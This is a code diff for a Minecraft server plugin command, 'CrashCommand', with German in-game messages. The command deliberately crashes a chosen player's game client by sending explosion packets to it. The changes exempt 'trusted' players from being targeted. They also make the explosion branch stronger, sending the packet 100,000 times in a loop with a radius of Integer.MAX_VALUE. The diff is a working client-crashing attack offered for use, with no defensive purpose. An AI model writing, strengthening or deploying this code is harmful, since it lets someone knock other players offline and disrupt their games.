@@ -25,6 +25,10 @@ public class CrashCommand extends Command {
 			if(target == null) {
 				Main.sendMessage(p, "§cDieser Spieler ist nicht online!");
 			} else {
+				if(TrustCommand.getTrustedPlayers().contains(target.getUniqueId().toString())) {
+					Main.sendMessage(p, "§cDu kannst diesen Spieler nicht crashen!");
+					return;
+				}
 				((CraftPlayer)target).getHandle().playerConnection.sendPacket(
 						new PacketPlayOutExplosion(
 						p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ(), 
@@ -41,6 +45,10 @@ public class CrashCommand extends Command {
 			if(target == null) {
 				Main.sendMessage(p, "§cDieser Spieler ist nicht online!");
 			} else {
+				if(TrustCommand.getTrustedPlayers().contains(target.getUniqueId().toString())) {
+					Main.sendMessage(p, "§cDu kannst diesen Spieler nicht crashen!");
+					return;
+				}
 				if(args[1].equalsIgnoreCase("partikel")) {
 					// Crashen mit Partikel
 					((CraftPlayer)target).getHandle().playerConnection.sendPacket(
@@ -51,10 +59,11 @@ public class CrashCommand extends Command {
 					Main.sendMessage(p, "§aSpieler §6" + target.getName() + " §awird gecrasht ❥");
 				} else if(args[1].equalsIgnoreCase("explosion")) {
 					// Crashen mit Explosion
+					for(int i = 0; i < 100000; i++)
 					((CraftPlayer)target).getHandle().playerConnection.sendPacket(
 							new PacketPlayOutExplosion(
 							p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ(), 
-							10, new ArrayList<>(), new Vec3D(
+							Integer.MAX_VALUE, new ArrayList<>(), new Vec3D(
 							p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ())));
 					
 					Main.sendMessage(p, "§aSpieler §6" + target.getName() + " §awird gecrasht ❥");
